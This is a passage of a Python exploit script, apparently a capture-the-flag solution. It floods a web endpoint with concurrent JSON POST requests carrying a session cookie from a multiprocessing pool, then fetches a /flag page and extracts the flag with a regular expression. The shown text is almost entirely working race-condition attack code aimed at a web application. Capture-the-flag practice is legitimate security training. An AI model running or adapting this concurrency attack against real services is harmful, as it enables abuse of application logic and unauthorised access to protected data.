    requests.post(base_url, cookies={
        'session': session_cookie
    }, json=([{
        "arg": "value"
    }] * random.randint(5, 20) ))


pool = Pool(WORKER_NUMBER)
result = pool.map_async(worker, range(WORKER_NUMBER)).get(0xffff)

r = requests.get(f"{base_url}/flag", cookies={
    'session': session_cookie
})

f = re.findall('flag\{.*\}', r.text)
if len(f) > 0:
    print(f[0])
else:
    print("Zero luck")
